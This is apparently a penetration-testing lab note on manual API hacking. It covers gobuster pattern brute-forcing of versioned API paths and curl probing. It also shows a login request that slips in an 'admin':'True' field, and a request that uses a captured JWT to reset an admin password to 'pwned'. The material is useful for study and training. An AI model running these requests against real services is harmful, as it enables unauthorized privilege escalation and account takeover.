API paths are often followed by a version number, resulting in a pattern such as:
```
/api_name/v1
```
The API name is often quite descriptive about the feature or data it uses to operate, followed directly by the version number.

With this information, let's try brute forcing the API paths using a wordlist along with the pattern Gobuster feature. We can call this feature by using the -p option and providing a file with patterns. For our test, we'll create a simple pattern file on our Kali system containing the following text:
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```
# Manual API Hacking
## Scan for API's
To run a pattern file for enumerating API's, use the following command:
```bash
gobuster dir -u http://[Web address/ip]:[port] -w /usr/share/wordlists/dirb/big.txt -p pattern
```
To enumerate a specific API:
```bash
gobuster dir -u http:[Web address/ip]:[port] -w /usr/share/wordlists/dirb/big.txt -p pattern
```
## Enumerating API's further
* Try curl discovered API's!
```bash
curl -i http://[Web address/ip]/path/to/api
```
* Depending on results, try bruteforcing scanning other specific API's (i.e. if /users returns an admin, try bruteforcing /users/v1/admin for other API's).

Rinse and Repeat! 
## Interacting with API's
If interesting API's require data to be posted, refer to the following example:
```bash
curl -d '{"password":"fake","username":"admin", "admin":"True"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```
If a JWT auth token is received, be sure to post it as an "Authorization: Oauth" header, like in the example below:
```bash
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```
If the above command does not work, be sure to try other methods such as PUT or PATCH:
```bash
curl -X [METHOD]
```
* Using Burp instead!
* Switch on burp proxy
* Turn on intercept 
* Run a curl command to the API using the following command:
```bash
curl /path/to/api -d "{'key':'data'}" --proxy 127.0.0.1:8080
```
* Send the request to repeater
